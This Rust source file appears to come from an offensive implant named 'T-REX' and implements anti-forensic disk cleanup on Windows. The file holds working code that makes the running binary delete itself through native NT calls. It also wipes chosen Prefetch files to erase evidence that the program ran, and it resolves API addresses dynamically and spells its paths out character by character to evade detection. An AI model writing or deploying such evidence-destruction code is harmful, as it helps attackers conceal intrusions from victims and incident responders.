//! T-REX Forensic Artifact Cleanup — disk trace removal (last resort).
//!
//! # Operations
//! 1. Self-delete: NtSetInformationFile(FileDispositionInformationEx) + POSIX
//! 2. Prefetch wipe: NtDeleteFile on matching .pf files

#![cfg(target_os = "windows")]

use core::ffi::c_void;

// ---- Type aliases ---------------------------------------------------------

type NtCreateFileFn = unsafe extern "system" fn(
    *mut isize,
    *mut c_void,
    *mut c_void,
    *mut c_void,
    *mut c_void,
    u32,
    u32,
    u32,
    u32,
    *mut c_void,
    u32,
) -> i32;

type NtSetInformationFileFn =
    unsafe extern "system" fn(isize, *mut c_void, *mut c_void, u32, u32) -> i32;

type NtCloseFn = unsafe extern "system" fn(isize) -> i32;

type NtDeleteFileFn = unsafe extern "system" fn(*mut c_void) -> i32;

// ---- Constants ------------------------------------------------------------

const DELETE: u32 = 0x0001_0000;
#[allow(dead_code)]
const SYNCHRONIZE: u32 = 0x0010_0000;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const FILE_SHARE_READ: u32 = 1;
const FILE_SHARE_WRITE: u32 = 2;
const FILE_OPEN: u32 = 1;
const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const FILE_DELETE_ON_CLOSE: u32 = 0x0000_0400;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;

const FILE_DISPOSITION_DELETE: u32 = 1;
const FILE_DISPOSITION_POSIX_SEMANTICS: u32 = 2;
const FILE_DISPOSITION_INFO_EX: u32 = 64;

// ---- Structs --------------------------------------------------------------

#[repr(C)]
struct IoStatusBlock {
    st: i32,
    info: usize,
}

#[repr(C)]
struct FileDispInfoEx {
    flags: u32,
}

#[repr(C)]
struct UnicodeStr {
    len: u16,
    max: u16,
    buf: *const u16,
}

#[repr(C)]
struct ObjAttr {
    len: u32,
    root: isize,
    name: *const UnicodeStr,
    attrs: u32,
    sd: *mut c_void,
    qos: *mut c_void,
}

// ---- 1. Self-Delete -------------------------------------------------------

pub unsafe fn self_delete(path: &[u16]) -> bool {
    let create_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtCreateFile") {
        Some(a) => a,
        None => return false,
    };
    let create: NtCreateFileFn = core::mem::transmute(create_addr);

    let set_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtSetInformationFile") {
        Some(a) => a,
        None => return false,
    };
    let set_info: NtSetInformationFileFn = core::mem::transmute(set_addr);

    let close_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtClose") {
        Some(a) => a,
        None => return false,
    };
    let close: NtCloseFn = core::mem::transmute(close_addr);

    let us = UnicodeStr {
        len: (path.len() * 2) as u16,
        max: 256,
        buf: path.as_ptr(),
    };
    let oa = ObjAttr {
        len: core::mem::size_of::<ObjAttr>() as u32,
        root: 0,
        name: &us,
        attrs: OBJ_CASE_INSENSITIVE,
        sd: core::ptr::null_mut(),
        qos: core::ptr::null_mut(),
    };
    let mut iosb = IoStatusBlock { st: 0, info: 0 };
    let mut h: isize = 0;

    let status = create(
        &mut h,
        &oa as *const ObjAttr as *mut c_void,
        core::ptr::null_mut(),
        &mut iosb as *mut IoStatusBlock as *mut c_void,
        core::ptr::null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        DELETE | FILE_DELETE_ON_CLOSE | FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut(),
        0,
    );

    if status < 0 {
        return false;
    }

    let mut disp = FileDispInfoEx {
        flags: FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS,
    };
    set_info(
        h,
        &mut iosb as *mut IoStatusBlock as *mut c_void,
        &mut disp as *mut FileDispInfoEx as *mut c_void,
        core::mem::size_of::<FileDispInfoEx>() as u32,
        FILE_DISPOSITION_INFO_EX,
    );
    close(h);
    true
}

// ---- 2. Prefetch Wipe -----------------------------------------------------

pub unsafe fn wipe_prefetch(names: &[&[u16]]) {
    let del_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtDeleteFile") {
        Some(a) => a,
        None => return,
    };
    let nt_del: NtDeleteFileFn = core::mem::transmute(del_addr);

    for name in names {
        let mut path = [0u16; 128];
        let prefix: &[u16] = &[
            b'\\' as u16,
            b'?' as u16,
            b'?' as u16,
            b'\\' as u16,
            b'C' as u16,
            b':' as u16,
            b'\\' as u16,
            b'W' as u16,
            b'i' as u16,
            b'n' as u16,
            b'd' as u16,
            b'o' as u16,
            b'w' as u16,
            b's' as u16,
            b'\\' as u16,
            b'P' as u16,
            b'r' as u16,
            b'e' as u16,
            b'f' as u16,
            b'e' as u16,
            b't' as u16,
            b'c' as u16,
            b'h' as u16,
            b'\\' as u16,
        ];
        let pl = prefix.len();
        path[..pl].copy_from_slice(prefix);
        path[pl..pl + name.len()].copy_from_slice(name);

        let us = UnicodeStr {
            len: ((pl + name.len()) * 2) as u16,
            max: 256,
            buf: path.as_ptr(),
        };
        let oa = ObjAttr {
            len: core::mem::size_of::<ObjAttr>() as u32,
            root: 0,
            name: &us,
            attrs: OBJ_CASE_INSENSITIVE,
            sd: core::ptr::null_mut(),
            qos: core::ptr::null_mut(),
        };
        nt_del(&oa as *const ObjAttr as *mut c_void);
    }
}
